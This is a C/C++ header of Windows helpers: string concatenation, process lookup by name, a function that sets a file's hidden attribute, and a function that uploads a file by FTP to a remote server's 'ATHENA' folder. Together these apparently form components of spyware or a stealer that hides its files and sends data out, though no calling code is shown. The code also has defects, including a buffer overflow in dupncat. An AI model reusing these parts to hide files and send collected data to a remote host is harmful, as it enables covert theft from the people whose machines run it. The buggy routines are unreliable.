#pragma once 


/*Common variables*/
FILE *out;

char *dupcat(const char *s1, ...){
	int len;
	char *p, *q, *sn;
	va_list ap;

	len = strlen(s1);
	va_start(ap, s1);
	while (1) {
		sn = va_arg(ap, char *);
		if (!sn)
			break;
		len += strlen(sn);
	}
	va_end(ap);

	p = new char[len + 1];
	strcpy(p, s1);
	q = p + strlen(p);

	va_start(ap, s1);
	while (1) {
		sn = va_arg(ap, char *);
		if (!sn)
			break;
		strcpy(q, sn);
		q += strlen(q);
	}
	va_end(ap);

	return p;
}

char *dupncat(const char *s1, unsigned int n){
	char *p, *q;

	p = new char[n + 1];
	q = p;
	for (int i = 0; i < n; i++) {
		strcpy(q + i, s1);
	}

	return p;
}

DWORD *FindProcessIDs(char * procName, int *count){
	PROCESSENTRY32 info;
	int e = 1;
	*count = 0;
	DWORD *ret = (DWORD *)malloc(sizeof(DWORD)* e);
	info.dwSize = sizeof(info);
	HANDLE prc = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (!prc){
		CloseHandle(prc);
		return 0;
	}
	if (Process32First(prc, &info) != FALSE){
		while (Process32Next(prc, &info) != 0){
			if (!strcmp(info.szExeFile, procName) != 0){
				ret = (DWORD *)realloc(ret, sizeof(DWORD)* e);
				ret[e - 1] = info.th32ProcessID;
				*count = e;
				e++;
			}
		}
	}
	CloseHandle(prc);
	return ret;
	//Free(ret);
}

void hide_file(char * file)
{
	if (GetFileAttributes(file) != 0x22)
		SetFileAttributes(file, 0x22);
}

BOOL uploadFile(char *filename, char *destination_name, char *address, char *username, char *password)
{
	BOOL t = false;
	HINTERNET hint, hftp;
	hint = InternetOpen("FTP", INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, INTERNET_FLAG_ASYNC);
	hftp = InternetConnect(hint, address, INTERNET_DEFAULT_FTP_PORT, username, password, INTERNET_SERVICE_FTP, INTERNET_FLAG_PASSIVE, 0);
	FtpSetCurrentDirectory(hftp, "ATHENA");
	t = FtpPutFile(hftp, filename, destination_name, FTP_TRANSFER_TYPE_BINARY, 0);
	InternetCloseHandle(hftp);
	InternetCloseHandle(hint);
	return t;
}